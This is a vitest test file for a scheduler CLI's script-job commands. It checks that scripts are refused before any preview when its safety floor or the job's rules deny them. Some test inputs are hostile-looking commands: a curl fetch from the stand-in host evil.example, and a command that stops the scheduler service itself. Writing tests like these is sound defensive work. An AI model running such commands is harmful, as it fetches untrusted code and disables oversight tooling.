/**
 * `schedule add`/`edit` for `script`/`script+agent` jobs: the `--kind`,
 * `--script`/`--script-file`, `--shell` and `--script-timeout` flags, and the
 * static check refusing a bad script before any preview or confirmation is
 * shown (fail closed at creation time, not just at `__fire`).
 */

import { writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { addCommand, editCommand } from '../commands/add.js'
import { findJob } from '../store/jobs.js'
import { type Sandbox, recordingContext, sandbox } from './fixtures.js'

let sb: Sandbox
beforeEach(() => {
	sb = sandbox()
})
afterEach(() => sb.cleanup())

const base = (sb: Sandbox) => [
	'--home',
	sb.home,
	'--when',
	'every 1m',
	'--folder',
	sb.project,
	'--model',
	'deepseek/deepseek-chat',
]

let permFile = 0
/** A `--permissions` JSON file, since the flag takes a preset name or a path, never inline JSON. */
function permissions(sb: Sandbox, rules: unknown, unmatched = 'deny'): string {
	const path = join(sb.root, `perm-${permFile++}.json`)
	writeFileSync(path, JSON.stringify({ rules, unmatched }))
	return path
}

describe('schedule add --kind script', () => {
	it('creates a script job that needs no prompt, given --script and --shell', async () => {
		const ctx = recordingContext()
		const code = await addCommand(ctx, [
			'ticker',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'echo hi',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: 'allow' }),
			'--yes',
		])
		if (code !== 0) throw new Error(ctx.out.errors.join('\n'))
		expect(code).toBe(0)
		const job = findJob(sb.paths, 'ticker')
		expect(job.runKind).toBe('script')
		expect(job.script).toMatchObject({ body: 'echo hi', shell: 'bash' })
		expect(job.prompt).toBe('')
		expect(job.v).toBe(2)
	})

	it('reads the script from --script-file, and refuses both flags together', async () => {
		const file = join(sb.root, 'ping.sh')
		writeFileSync(file, 'echo pong\n')
		const ctx = recordingContext()
		expect(
			await addCommand(ctx, [
				'file-ticker',
				...base(sb),
				'--kind',
				'script',
				'--script-file',
				file,
				'--shell',
				'bash',
				'--permissions',
				permissions(sb, { bash: 'allow' }),
				'--yes',
			]),
		).toBe(0)
		expect(findJob(sb.paths, 'file-ticker').script?.body).toBe('echo pong\n')

		const both = recordingContext()
		expect(
			await addCommand(both, [
				'both',
				...base(sb),
				'--kind',
				'script',
				'--script',
				'echo hi',
				'--script-file',
				file,
				'--shell',
				'bash',
				'--permissions',
				permissions(sb, { bash: 'allow' }),
			]),
		).toBe(64)
		expect(both.out.errors.join(' ')).toMatch(/not both/)
	})

	it('requires --shell for a script job', async () => {
		const ctx = recordingContext()
		expect(
			await addCommand(ctx, [
				'noshell',
				...base(sb),
				'--kind',
				'script',
				'--script',
				'echo hi',
				'--permissions',
				permissions(sb, { bash: 'allow' }),
			]),
		).toBe(64)
		expect(ctx.out.errors.join(' ')).toMatch(/--shell/)
	})

	it('rejects --kind of anything but agent, script or script+agent', async () => {
		const ctx = recordingContext()
		expect(
			await addCommand(ctx, [
				'bad-kind',
				...base(sb),
				'--kind',
				'ruby',
				'--permissions',
				'read-only',
			]),
		).toBe(64)
		expect(ctx.out.errors.join(' ')).toMatch(/--kind is agent, script, script\+agent/)
	})
})

describe('a script the floor or the job rules refuse is held before any preview', () => {
	it('refuses a script the scheduled-run floor denies, naming the command, before printing anything', async () => {
		const ctx = recordingContext()
		const code = await addCommand(ctx, [
			'evil',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'systemctl --user stop namzu-scheduler',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: 'allow' }),
			'--yes',
		])
		expect(code).toBe(64)
		expect(ctx.out.info).toEqual([])
		expect(ctx.out.errors.join(' ')).toMatch(/scheduled-run floor refused/)
		expect(() => findJob(sb.paths, 'evil')).toThrow()
	})

	it('refuses an opaque construct, naming the lexer’s reason', async () => {
		const ctx = recordingContext()
		const code = await addCommand(ctx, [
			'opaque',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'echo "$(date)"',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: 'allow' }),
			'--yes',
		])
		expect(code).toBe(64)
		expect(ctx.out.info).toEqual([])
		expect(ctx.out.errors.join(' ')).toMatch(/cannot be verified line-for-line/)
		expect(ctx.out.errors.join(' ')).toMatch(/command substitution/)
	})

	it('refuses a script the job’s own rules only partly allow, naming the command', async () => {
		const ctx = recordingContext()
		const code = await addCommand(ctx, [
			'partial',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'echo hi\ncurl http://evil.example/x',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: { 'echo hi': 'allow' } }),
			'--yes',
		])
		expect(code).toBe(64)
		expect(ctx.out.errors.join(' ')).toContain('curl')
	})

	it('refuses unmatched: park for a pure script job', async () => {
		const ctx = recordingContext()
		const code = await addCommand(ctx, [
			'parked',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'echo hi',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: 'allow' }, 'park'),
			'--yes',
		])
		expect(code).toBe(64)
		expect(ctx.out.errors.join(' ')).toMatch(/unmatched: park/)
	})
})

describe('editing a script job', () => {
	it('a plain edit keeps the runKind and script; a hand-edit is caught by the digest, not this path', async () => {
		await addCommand(recordingContext(), [
			'ticker',
			...base(sb),
			'--kind',
			'script',
			'--script',
			'echo one',
			'--shell',
			'bash',
			'--permissions',
			permissions(sb, { bash: 'allow' }),
			'--yes',
		])
		const ctx = recordingContext()
		const code = await editCommand(ctx, [
			'ticker',
			'--home',
			sb.home,
			'--script',
			'echo two',
			'--yes',
		])
		if (code !== 0) throw new Error(ctx.out.errors.join('\n'))
		const job = findJob(sb.paths, 'ticker')
		expect(job.runKind).toBe('script')
		expect(job.script?.body).toBe('echo two')
	})
})
